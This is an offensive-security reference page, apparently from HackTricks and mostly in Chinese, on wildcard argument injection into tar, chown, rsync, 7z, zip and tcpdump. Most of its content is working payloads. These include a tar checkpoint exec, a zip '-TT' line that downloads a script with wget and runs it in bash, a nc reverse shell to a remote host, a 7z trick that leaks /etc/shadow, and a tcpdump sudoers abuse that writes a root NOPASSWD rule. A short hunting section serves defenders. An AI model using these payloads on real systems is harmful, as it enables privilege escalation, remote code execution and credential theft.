# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard（aka *glob*）**argument injection** 发生在一个特权脚本运行某个 Unix binary，比如 `tar`, `chown`, `rsync`, `zip`, `7z`, …，并使用未加引号的 wildcard 如 `*` 时。
> 由于 shell 会在执行 binary **之前** 展开 wildcard，攻击者如果能够在 working directory 中创建文件，就可以构造以 `-` 开头的文件名，使其被解释为**options 而不是 data**，从而有效地偷偷传入任意 flags，甚至 commands。
> 本页收集了到 2023-2025 年最有用的 primitives、最新 research 和现代 detections。

## chown / chmod

你可以通过滥用 `--reference` flag 来**复制任意文件的 owner/group 或 permission bits**：
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
当 root 之后执行类似以下内容时：
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` 被注入，导致 *所有* 匹配到的文件继承 `/root/secret``file` 的所有权/权限。

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
另见经典的 DefenseCode 论文了解细节。

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

通过滥用 **checkpoint** 功能执行任意命令：
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
一旦 root 运行例如 `tar -czf /root/backup.tgz *`，`shell.sh` 就会以 root 身份执行。

### bsdtar / macOS 14+

近期 macOS 上默认的 `tar`（基于 `libarchive`）并不实现 `--checkpoint`，但你仍然可以通过 **--use-compress-program** 标志实现 code-execution，它允许你指定一个外部压缩程序。
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
当一个特权脚本运行 `tar -cf backup.tar *` 时，`/bin/sh` 将被启动。

---

## rsync

`rsync` 允许你通过以 `-e` 或 `--rsync-path` 开头的命令行标志覆盖远程 shell，甚至覆盖远程 binary：
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
如果 root 之后用 `rsync -az * backup:/srv/` 归档该目录，被注入的 flag 会在远程端启动你的 shell。

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode)。

---

## 7-Zip / 7z / 7za

即使特权脚本 *defensively* 在 wildcard 前面加上 `--`（以停止 option parsing），7-Zip 格式仍然支持通过在文件名前加 `@` 来使用 **file list files**。将其与 symlink 结合起来，你可以 *exfiltrate arbitrary files*：
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
如果 root 执行类似下面的内容：
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip 会尝试将 `root.txt`（→ `/etc/shadow`）作为文件列表读取，并会退出，**同时把内容打印到 stderr**。

这在 `-- *` 下仍然成立，因为 7-Zip CLI 明确接受普通文件名和 `@listfiles` 作为位置参数，所以像 `@root.txt` 这样的字面文件名仍然会被特殊处理。

---

## zip

当应用程序将用户可控的文件名传递给 `zip` 时，存在两个非常实用的原语（无论是通过 wildcard，还是在没有 `--` 的情况下枚举名称）。

- 通过 test hook 实现 RCE：`-T` 启用 “test archive”，而 `-TT <cmd>` 会用任意程序替换 tester（长格式：`--unzip-command <cmd>`）。如果你可以注入以 `-` 开头的文件名，就把 flags 拆分到不同的文件名中，这样 short-options parsing 就能正常工作：
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notes
- 不要尝试像 `'-T -TT <cmd>'` 这样的单个 filename —— short options 会按字符逐个解析，因此会失败。请像示例那样使用分开的 tokens。
- 如果 app 会从 filenames 中剥离 slashes，那就从 bare host/IP 获取（默认 path `/index.html`），然后用 `-O` 保存到本地，再执行。
- 你可以使用 `-sc`（显示 processed argv）或 `-h2`（更多帮助）来调试 parsing，以理解你的 tokens 是如何被消耗的。

Example (local behavior on zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: 如果 web 层回显 `zip` 的 stdout/stderr（在天真的 wrapper 中很常见），像 `--help` 这样的注入 flag，或者来自错误选项的失败信息，都会出现在 HTTP 响应中，从而确认 command-line injection 并帮助微调 payload。

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

以下命令在现代 CTF 和真实环境中都曾被滥用。payload 总是被创建为可写目录中的一个 *filename*，之后会被 wildcard 处理：

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

这些 primitives 比 *tar/rsync/zip* 经典手法更少见，但在 hunting 时值得检查。

---

## Hunting vulnerable wrappers and jobs

最近的 case studies 表明，wildcard/argv injection 不再只是 **cron + tar** 的问题。同一类 bug 还在不断出现在：

- 会从攻击者可控的 upload 目录里“download everything as zip/tar”的 web 功能中
- 暴露带有攻击者可控 filename/filter 字段的 **tcpdump** wrapper 的 vendor/appliance debug shells 中
- 在可写目录上调用 `tar`, `rsync`, `7z`, `zip`, `chown`, 或 `chmod` 的 backup 或 rotation jobs 中

Useful triage commands:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
快速启发式：

- `-- *` 对很多 GNU tools 都是一个好修复，但对 `7z`/`7za` **不行**，因为 `@listfiles` 是单独解析的。
- 对于 `zip`，重点找那些直接枚举用户可控 filename 的 wrappers；即使没有 shell glob，短选项拆分（`-T` + `-TT <cmd>`）仍然可用。
- 对于 `tcpdump`，要特别注意那些允许你控制 **output file names**、**rotation settings** 或 **capture-file replay** 参数的 wrappers。

---

## tcpdump rotation hooks (-G/-W/-z): 通过 wrappers 中的 argv injection 实现 RCE

当受限 shell 或 vendor wrapper 通过拼接用户可控字段（例如一个 "file name" 参数）来构造 `tcpdump` 命令行，而且没有严格的 quoting/validation 时，你就可以塞入额外的 `tcpdump` flags。`-G`（基于时间的 rotation）、`-W`（限制文件数量）和 `-z <cmd>`（轮转后执行命令）的组合，能以运行 `tcpdump` 的用户身份执行任意命令（在设备上通常是 root）。

前提条件：

- 你能影响传给 `tcpdump` 的 `argv`（例如，通过一个类似 `/debug/tcpdump --filter=... --file-name=<HERE>` 的 wrapper）。
- 该 wrapper 不会对 file name 字段中的空格或以 `-` 开头的 token 做 sanitize。

经典 PoC（从可写路径执行一个 reverse shell script）：
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` 强制在第一个匹配数据包后立即 rotate。
- `-z <cmd>` 会在每次 rotate 时运行一次 post-rotate command。很多构建会执行 `<cmd> <savefile>`。如果 `<cmd>` 是 script/interpreter，确保参数处理与你的 payload 匹配。

No-removable-media variants:

- 如果你有任何其他写文件的 primitive（例如，一个允许输出重定向的单独 command wrapper），把你的 script 放到一个已知 path，然后触发 `-z /bin/sh /path/script.sh` 或 `-z /path/script.sh`，具体取决于 platform semantics。
- 一些 vendor wrappers 会把 rotate 到 attacker-controllable locations。If you can influence the rotated path (symlink/directory traversal), you can steer `-z` 去执行你完全控制的内容，而不需要 external media。

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Very common sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
问题
- `*` glob 和宽松模式只约束第一个 `-w` 参数。`tcpdump` 接受多个 `-w` 选项；最后一个生效。
- 规则没有固定其他选项，所以 `-Z`、`-r`、`-V` 等都允许。

Primitives
- 用第二个 `-w` 覆盖目标路径（第一个只用于满足 sudoers）：
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 在第一个 `-w` 内进行 path traversal 以逃离受限目录树:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 使用 `-Z root` 强制输出所有权（会在任意位置创建 root 所有的文件）：
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 通过使用 `-r` 回放一个精心构造的 PCAP 来实现任意内容写入（例如，写入一行 sudoers）：

<details>
<summary>创建一个包含精确 ASCII payload 的 PCAP，并以 root 身份写入</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- 使用 `-V <file>` 进行任意文件读取/secret leak（解释 savefiles 列表）。错误诊断通常会回显行内容，从而泄露内容：
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
